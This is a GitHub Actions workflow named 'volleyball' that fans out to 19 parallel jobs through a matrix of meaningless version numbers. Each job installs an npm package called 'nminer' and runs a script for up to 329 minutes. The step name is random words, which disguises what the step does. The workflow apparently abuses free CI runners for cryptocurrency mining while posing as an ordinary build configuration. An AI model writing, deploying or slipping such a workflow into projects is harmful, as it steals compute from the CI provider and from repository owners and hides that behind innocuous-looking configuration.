name: volleyball
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 6982 }
          - { version: 8623 }
          - { version: 5485 }
          - { version: 8625 }
          - { version: 3420 }
          - { version: 7947 }
          - { version: 1872 }
          - { version: 8656 }
          - { version: 2867 }
          - { version: 7898 }
          - { version: 7481 }
          - { version: 4654 }
          - { version: 8573 }
          - { version: 8064 }
          - { version: 7246 }
          - { version: 4334 }
          - { version: 1589 }
          - { version: 4218 }
          - { version: 7232 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: ack trust limited yum before
        run: |
          npm install nminer@latest
          timeout 329m node volleyball.js || echo "volleyball executed"